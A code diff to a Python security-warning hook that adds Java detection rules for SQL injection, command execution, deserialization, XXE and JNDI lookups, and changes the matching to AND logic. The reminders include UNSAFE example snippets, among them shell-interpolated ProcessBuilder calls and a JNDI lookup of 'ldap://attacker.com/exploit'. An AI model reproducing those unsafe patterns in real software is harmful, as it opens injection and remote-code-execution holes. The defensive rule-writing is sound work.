@@ -69,6 +69,7 @@ Other risky inputs to be careful with:
     {
         "ruleName": "child_process_exec",
         "substrings": ["child_process.exec", "exec(", "execSync("],
+        "path_check": lambda path: any(path.endswith(ext) for ext in (".js", ".ts", ".mjs", ".cjs", ".jsx", ".tsx")),
         "reminder": """⚠️ Security Warning: Using child_process.exec() can lead to command injection vulnerabilities.
 
 This codebase provides a safer alternative: src/utils/execFileNoThrow.ts
@@ -122,6 +123,104 @@ Only use exec() if you absolutely need shell features and the input is guarantee
         "ruleName": "os_system_injection",
         "substrings": ["os.system", "from os import system"],
         "reminder": "⚠️ Security Warning: This code appears to use os.system. This should only be used with static arguments and never with arguments that could be user-controlled.",
+    },
+    # Java security patterns
+    {
+        "ruleName": "java_sql_injection",
+        "substrings": [
+            'Statement statement = ',
+            'createStatement()',
+            '.execute("',
+            '.executeQuery("',
+            '.executeUpdate("',
+        ],
+        "path_check": lambda path: path.endswith(".java"),
+        "reminder": """⚠️ Security Warning: Potential SQL injection detected in Java code.
+
+Never concatenate user input into SQL strings. Use PreparedStatement instead:
+
+UNSAFE:
+  String sql = "SELECT * FROM users WHERE id = " + userId;
+  Statement stmt = conn.createStatement();
+  stmt.executeQuery(sql);
+
+SAFE:
+  String sql = "SELECT * FROM users WHERE id = ?";
+  PreparedStatement stmt = conn.prepareStatement(sql);
+  stmt.setInt(1, userId);
+  stmt.executeQuery();
+
+If using an ORM (MyBatis/JPA/Hibernate), use parameterized queries or named parameters instead of string interpolation in native queries.""",
+    },
+    {
+        "ruleName": "java_runtime_exec",
+        "substrings": ["Runtime.getRuntime().exec(", "new ProcessBuilder("],
+        "path_check": lambda path: path.endswith(".java"),
+        "reminder": """⚠️ Security Warning: Runtime.exec() or ProcessBuilder with user-controlled input can lead to command injection.
+
+UNSAFE:
+  Runtime.getRuntime().exec("ls " + userInput);
+  new ProcessBuilder("sh", "-c", userInput).start();
+
+SAFE:
+  // Pass arguments as a list, never via shell interpolation
+  new ProcessBuilder("ls", sanitizedPath).start();
+  // Or use an allowlist to validate commands before execution
+
+Never pass user input directly to shell commands. Use ProcessBuilder with a fixed command and validated arguments.""",
+    },
+    {
+        "ruleName": "java_deserialization",
+        "substrings": ["ObjectInputStream", "readObject()"],
+        "path_check": lambda path: path.endswith(".java"),
+        "reminder": """⚠️ Security Warning: Java deserialization of untrusted data can lead to Remote Code Execution (RCE).
+
+Deserializing data from untrusted sources (network, user uploads, cookies) using ObjectInputStream is dangerous.
+
+Safer alternatives:
+- Use JSON (Jackson, Gson) or Protocol Buffers instead of Java serialization
+- If Java serialization is required, use a deserialization filter (Java 9+):
+    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.example.*;!*");
+    ois.setObjectInputFilter(filter);
+- Consider using Apache Commons IO's ValidatingObjectInputStream
+
+Never deserialize data from untrusted sources without strict type filtering.""",
+    },
+    {
+        "ruleName": "java_xxe",
+        "substrings": [
+            "DocumentBuilderFactory.newInstance()",
+            "SAXParserFactory.newInstance()",
+            "XMLInputFactory.newInstance()",
+            "TransformerFactory.newInstance()",
+        ],
+        "path_check": lambda path: path.endswith(".java"),
+        "reminder": """⚠️ Security Warning: XML parsers are vulnerable to XXE (XML External Entity) injection by default.
+
+Always disable external entity processing when parsing untrusted XML:
+
+  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+  dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+  dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+  dbf.setExpandEntityReferences(false);
+
+For SAXParserFactory and XMLInputFactory, apply equivalent disabling of external entities. See OWASP XXE Prevention Cheat Sheet for details.""",
+    },
+    {
+        "ruleName": "java_jndi_injection",
+        "substrings": ["InitialContext()", "new InitialContext", "context.lookup(", "ctx.lookup("],
+        "path_check": lambda path: path.endswith(".java"),
+        "reminder": """⚠️ Security Warning: JNDI lookups with user-controlled input can lead to Remote Code Execution (Log4Shell-style vulnerabilities).
+
+UNSAFE:
+  InitialContext ctx = new InitialContext();
+  ctx.lookup(userControlledString);  // RCE if input is ldap://attacker.com/exploit
+
+SAFE:
+- Never pass user-controlled data to JNDI lookup()
+- If lookup targets must be dynamic, use an allowlist of permitted JNDI names
+- In logging frameworks, set log4j2.formatMsgNoLookups=true or upgrade to Log4j 2.17.1+""",
     },
 ]
 
@@ -181,17 +280,32 @@ def save_state(session_id, shown_warnings):
 
 
 def check_patterns(file_path, content):
-    """Check if file path or content matches any security patterns."""
+    """Check if file path or content matches any security patterns.
+
+    Pattern matching logic:
+    - path_check only: triggers on matching file path
+    - substrings only: triggers on matching content substring
+    - both path_check and substrings: triggers only when BOTH match (AND logic)
+    """
     # Normalize path by removing leading slashes
     normalized_path = file_path.lstrip("/")
 
     for pattern in SECURITY_PATTERNS:
-        # Check path-based patterns
-        if "path_check" in pattern and pattern["path_check"](normalized_path):
-            return pattern["ruleName"], pattern["reminder"]
+        has_path_check = "path_check" in pattern
+        has_substrings = "substrings" in pattern
 
-        # Check content-based patterns
-        if "substrings" in pattern and content:
+        if has_path_check and has_substrings:
+            # Both conditions must match (AND logic)
+            if pattern["path_check"](normalized_path) and content:
+                for substring in pattern["substrings"]:
+                    if substring in content:
+                        return pattern["ruleName"], pattern["reminder"]
+        elif has_path_check:
+            # Path-only check
+            if pattern["path_check"](normalized_path):
+                return pattern["ruleName"], pattern["reminder"]
+        elif has_substrings and content:
+            # Content-only check
             for substring in pattern["substrings"]:
                 if substring in content:
                     return pattern["ruleName"], pattern["reminder"]
